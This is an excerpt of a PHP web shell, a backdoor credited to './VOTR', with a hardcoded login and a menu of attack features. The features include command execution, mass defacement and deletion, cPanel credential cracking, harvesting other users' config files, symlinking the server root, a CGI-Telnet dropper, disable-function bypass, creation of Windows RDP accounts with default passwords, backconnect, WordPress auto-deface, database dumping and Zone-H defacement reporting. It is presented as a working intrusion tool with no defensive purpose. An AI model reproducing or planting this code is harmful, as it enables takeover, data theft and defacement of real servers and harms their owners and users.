...
$auth_user =
"zer0iv";
$auth_pass = "dee940e601685a116ccbefb5247fae84"; //default : votrshell
$color = "#00ff00"; 
...
<body bgcolor="black">
 ...
 <header>
 <pre> 
<img src="https://slack-files2.s3-us-west-2.amazonaws.com/avatars/2017-05-03/178172234645_730ac1a261d34e4f358d_512.png"height="400">
 </pre> 
</header> 
<form method="post">
Username
...
<br>
<br>
<input type="submit"name="hajar bang"value="Login">
 </form> 
</body>
<?php 
exit; 
...
<link rel="shortcut icon" href="http://i.imgur.com/xLoOdwO.png"/>
<title>Shell Kids Kids Jaman Now!!!</title>
<style type="text/css">
body {
background: url(https://wallpaperscraft.com/image/dark_background_line_surface_65896_602x339.jpg) no-repeat fixed;
...
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
echo"<h1><center><font color='red'>Shell Kids Kids</font><font color='white'> Jaman Now</center></h1>
<table width='700' border='0' cellpadding='3' cellspacing='1' align='center'>
<tr><td><center><font color='white'>Current Dir :</font></font> ";
...
echo " <li><a href='?dir=$dir&votr=info'>Server Info</a></li>";
echo " <li><a href='?dir=$dir&votr=cmd'>Command</a></li>";
echo " <li><a href='?dir=$dir&votr=mass_deface'>Mass Deface</a></li>";
echo "  <li><a href='?dir=$dir&votr=mass_delete'> Mass Delete </a></li>";
echo "<br><br>";
echo "  <li><a href='?dir=$dir&votr=config'>Config</a></li>";
echo "  <li><a href='?dir=$dir&votr=jumping'>Loncat Indah</a></li>";
echo "  <li><a href='?dir=$dir&votr=cpanel'>Cpanel Crack</a></li>";
echo "  <li><a href='?dir=$dir&votr=sym'>Symlink</a></li>";
echo "  <li><a href='?dir=$dir&votr=network'>Network</a></li>";
echo "  <li><a href='?dir=$dir&votr=fake_root'>Fake Root</a></li><br><br>";
echo "  <li><a href='?dir=$dir&votr=cgi'>Cgi-Telnet</a></li>";
echo "  <li><a href='?dir=$dir&votr=bypass'>Bypass Disable Functions</a></li>";
echo "  <li><a href='?dir=$dir&votr=rdp'>K-RDP Shell</a></li>";
echo "  <li><a href='?dir=$dir&votr=backconnect'>Backconnect V.2</a></li>";
echo "  <li><a href='?dir=$dir&votr=zoneh'>Zone-H Mass Notifier</a></li>";
echo "<br><br>";
echo "  <li><a href='?dir=$dir&votr=upload'>Upload</a></li>";
echo "  <li><a href='?dir=$dir&votr=adminer'>Adminer</a></li>";
echo "  <li><a href='?dir=$dir&votr=edit_user'>Auto Edit User</a></li>";
echo "  <li><a href='?dir=$dir&votr=auto_wp'>Auto Edit Title WordPress</a></li>";
echo "  <li><a href='?dir=$dir&votr=auto_dwp'>WordPress Auto Deface</a></li>";
echo "  <li><a href='?dir=$dir&votr=dbdump'>DB Dump</a></li>";
echo "  <li><a href='?dir=$dir&votr=symlink2'>Symlink V.2</a></li>";
echo "<br><br>";
echo "  <li><a style='color: red;' href='?dir=$dir&votr=kill'>Kill Me</a></li>";
...
elseif($_GET['votr'] == 'mass_deface') {
	...
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by ./VOTR</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
	</form></center>";
	}
} elseif($_GET['votr'] == 'mass_delete') {
...
elseif($_GET['votr'] == 'sym') {
   @set_time_limit(0);
echo "<br><br><center><h1>+--=[ Symlink By ./VOTR ]=--+</h1></center><br><br><center><div class=content>";
@mkdir('sym',0777);
...
elseif($_GET['votr'] == 'cpanel') {
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>./VOTR.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
...
//CONFIG
elseif($_GET['votr'] == 'config') {
	$idx = mkdir("votr_config", 0777);
					...
					if(is_readable($user_config_dir)) {
						...
						foreach($grab_config as $config => $nama_config) {
							...
							if($ambil_config == '') {
								...
								$file_config = fopen("votr_config/$user_idx-$nama_config.txt","w");
	...
	echo "<center><a href='?dir=$dir/votr_config'><font color=lime>Done</font></a></center>";
	}
}
//FKROOT
elseif($_GET['votr'] == 'fake_root') {
	ob_start();
...
//kill me
elseif($_GET['votr'] == 'kill') {
	if(@unlink(preg_replace('!(d+)s.*!', '', __FILE__)))
			die('<center><br><center><h2>Shell removed</h2><br>Goodbye , Thanks for use my shell</center></center>');
		else
			echo '<center>Gagal Hapus Shell</center>';
}
//bypass disable functions
elseif($_GET['votr'] == 'bypass'){
		echo "<center>";
	...
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			...
			if($_POST['opsi'] == '1') {
				...
				$cek = exe("net user $user votr");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>votr</font>] -> ";
					if($cek) {
			...
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='votr' required>
			<input type='text' name='pass' placeholder='password' value='votrrdp' required>
...
elseif($_GET['votr'] == 'zoneh') {
	if($_POST['submit']) {
		...
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='./VOTR'><br>
		<u>Domains</u>: <br>
...
elseif($_GET['votr'] == 'edit_user') {
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='votr123' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='votrshell123' placeholder='pass_baru'><br>
...
elseif($_GET['votr'] == 'auto_wp') {
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by ./VOTR' placeholder='New Title'><br><br>
...
elseif($_GET['votr'] == 'auto_dwp') {
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by ./VOTR' required><br>
...
<td>".$user['name']."</td>
<td><a href='$full/votr_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
flush();
$dcount++;}}}
echo "</table>";
}else{
...
Satisfy Any';
 ...
 echo "<td align=center><font class=txt><a href=$full/votr_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("votr_sym",0777);@chdir("votr_sym");@exe("ln -s / root");$file3 = '
...
//cgitelnet
elseif($_GET['votr'] == 'cgi') {
	$cgi_dir = mkdir('votr_cgi', 0755);
	$file_cgi = "votr_cgi/cgi.izo";
	...
	chmod($file_cgi, 0755);
	echo "<iframe src='votr_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
	...
	echo "<center>Copyright &copy; ".date("Y")." - <a href='http://votr-official.info/' target='_blank'><font color=lime>./VOTR</font></a></center>";
}
?>
</html>
